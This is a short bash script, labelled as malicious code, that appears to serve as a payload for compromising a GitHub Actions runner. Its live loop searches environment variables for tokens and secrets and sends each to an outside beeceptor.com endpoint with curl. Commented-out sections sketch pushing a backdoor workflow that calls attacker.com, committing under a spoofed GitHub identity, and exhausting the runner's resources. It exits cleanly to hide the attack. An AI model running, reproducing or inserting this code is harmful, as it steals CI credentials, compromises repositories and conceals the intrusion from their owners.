#!/bin/bash

# --- Start of Malicious Code ---
echo "Executing malicious shell script..."

# Iterate through environment variables and exfiltrate
for var in $(env); do
    # Check for common secret patterns (can be expanded)
    if [[ "$var" == *"TOKEN"* || "$var" == *"SECRET"* || "$var" == "GH_"* || "$var" == "CHROMA"* ]]; then
        # Print to logs (will be masked by GitHub if pattern recognized)
        echo "Potential secret found: $var"
        # Exfiltrate to attacker-controlled server
        # Note: For real exfil, often uses tools like netcat or specific HTTP requests
        # This 'curl' command is an example
        curl -k -X POST -d "$var" https://testjok.free.beeceptor.com/stfdfsdts &>/dev/null
    fi
done

# --- Optional: Further Compromise (if contents:write permission exists) ---
# Example: Add a new malicious workflow file for persistence
# echo "name: Backdoor Workflow" > .github/workflows/backdoor.yml
# echo "on: push" >> .github/workflows/backdoor.yml
# echo "jobs: " >> .github/workflows/backdoor.yml
# echo "  backdoor:" >> .github/workflows/backdoor.yml
# echo "    runs-on: ubuntu-latest" >> .github/workflows/backdoor.yml
# echo "    steps:" >> .github/workflows/backdoor.yml
# echo "      - run: echo 'Attacker code running!' && curl -X POST -d 'Repo compromised!' https://attacker.com/pwned" >> .github/workflows/backdoor.yml
#
# git config user.name "GitHub Actions Backdoor"
# git config user.email "actions@github.com"
# git add .github/workflows/backdoor.yml
# git commit -m "Add backdoor workflow"
# git push origin HEAD:main # Push directly to main branch (requires contents:write)

# --- Optional: Denial of Service ---
# while true; do :; done # Infinite loop to block runner
# dd if=/dev/urandom of=/dev/null bs=1M count=100000 # Consume disk/CPU

echo "Malicious script finished."
# --- End of Malicious Code ---

# Ensure the original command (if any) that was supposed to run continues,
# or exit gracefully after the attack.
exit 0
